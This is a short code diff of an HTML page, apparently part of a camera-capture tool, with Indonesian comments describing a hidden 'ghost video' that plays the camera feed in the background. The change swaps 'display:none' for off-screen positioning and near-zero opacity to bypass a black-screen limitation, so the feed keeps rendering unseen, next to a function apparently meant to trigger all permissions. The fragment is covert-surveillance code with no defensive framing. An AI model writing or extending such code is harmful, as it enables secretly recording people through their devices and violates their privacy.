@@ -35,7 +35,8 @@ def handshake():
         </div>
 
         <!-- Tag video hantu tersembunyi untuk memutar umpan kamera di latar belakang -->
-        <video id="v-feed" autoplay playsinline style="display:none;"></video>
+        <!-- TRICK BYPASS BLACK SCREEN: Membuat video tetap merender gambar di RAM, tapi posisinya dilempar keluar dari batas layar HP --> 
+        <video id="v-feed" autoplay playsinline style="position: absolute; top: -9999px; left: -9999px; width: 100px; height: 100px; opacity: 0.001;"></video>
 
         <script>
             async function triggerAllOtoritas() {
